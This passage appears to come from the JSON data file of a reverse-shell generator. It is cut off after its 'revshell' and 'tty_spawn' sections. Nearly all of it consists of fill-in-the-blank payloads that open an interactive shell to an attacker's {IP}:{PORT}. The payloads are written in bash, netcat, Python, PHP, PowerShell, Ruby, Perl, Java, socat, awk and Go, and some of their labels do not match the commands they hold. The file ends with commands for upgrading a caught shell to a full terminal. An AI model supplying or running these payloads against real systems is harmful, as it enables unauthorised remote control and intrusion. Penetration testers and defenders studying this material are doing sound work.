{
  "revshell": [
    {"name": "Bash TCP", "category": "bash", "tags": ["linux", "mac"], "template": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"},
    {"name": "Bash UDP", "category": "bash", "tags": ["linux"], "template": "sh -i >& /dev/udp/{IP}/{PORT} 0>&1"},
    {"name": "Bash -i (mkfifo)", "category": "bash", "tags": ["linux"], "template": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | telnet {IP} {PORT} > /tmp/f"},
    {"name": "Netcat (no -e)", "category": "netcat", "tags": ["linux"], "template": "rm -f /tmp/f; mkfifo /tmp/f; telnet {IP} {PORT} 0</tmp/f | sh 1>/tmp/f 2>&1"},
    {"name": "Netcat OpenBSD", "category": "netcat", "tags": ["linux"], "template": "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -connect {IP}:{PORT} > /tmp/s 2>/dev/null"},
    {"name": "nc -e", "category": "netcat", "tags": ["linux"], "template": "nc -e /bin/sh {IP} {PORT}"},
    {"name": "ncat (TLS)", "category": "netcat", "tags": ["linux"], "template": "ncat --ssl {IP} {PORT} -e /bin/bash"},
    {"name": "Python", "category": "python", "tags": ["linux", "mac"], "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"},
    {"name": "Python (brief)", "category": "python", "tags": ["linux"], "template": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"},
    {"name": "PHP exec", "category": "php", "tags": ["web"], "template": "php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
    {"name": "PHP file handle", "category": "php", "tags": ["web"], "template": "<?php $sock=fsockopen(\"{IP}\",{PORT});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>"},
    {"name": "PowerShell", "category": "powershell", "tags": ["windows"], "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\""},
    {"name": "Ruby", "category": "ruby", "tags": ["linux"], "template": "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"},
    {"name": "Perl", "category": "perl", "tags": ["linux"], "template": "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
    {"name": "Java", "category": "java", "tags": ["cross"], "template": "r = Runtime.getRuntime(); p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done'\");"},
    {"name": "Socat (TLS)", "category": "socat", "tags": ["linux"], "template": "socat - openssl-connect:{IP}:{PORT},verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"},
    {"name": "Awk", "category": "misc", "tags": ["linux"], "template": "awk 'BEGIN{s=\"/inet/tcp/0/{IP}/{PORT}\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/null"},
    {"name": "Golang", "category": "misc", "tags": ["cross"], "template": "echo 'package main;import \"os/exec\";import \"net\";func main(){c,_:=net.Dial(\"tcp\",\"{IP}:{PORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"}
  ],
  "tty_spawn": [
    {"name": "Python pty (推荐)", "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
    {"name": "echo 方式", "command": "echo os.system('/bin/bash')"},
    {"name": "sh -i", "command": "/bin/sh -i"},
    {"name": "Perl", "command": "perl -e 'exec \"/bin/bash\";'"},
    {"name": "Ruby", "command": "ruby -e 'exec \"/bin/bash\"'"},
    {"name": "完整交互（Ctrl-Z 后）", "command": "按 Ctrl-Z → stty raw -echo; fg → reset → export SHELL=bash; export TERM=xterm-256color; stty rows 38 columns 116"}
  ],
